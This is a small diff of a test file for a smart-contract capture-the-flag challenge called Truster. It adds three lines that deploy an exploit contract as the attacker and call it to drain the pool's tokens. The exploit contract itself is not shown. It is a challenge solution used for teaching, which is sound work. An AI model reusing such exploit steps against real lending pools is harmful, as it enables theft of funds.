@@ -30,6 +30,9 @@ describe('[Challenge] Truster', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+        const TrustedLenderExploit = contract.fromArtifact('TrustedLenderExploit');
+        this.exploit = await TrustedLenderExploit.new({ from: attacker });
+        await this.exploit.exploit(this.pool.address, this.token.address, TOKENS_IN_POOL, {from: attacker});
     });
 
     after(async function () {
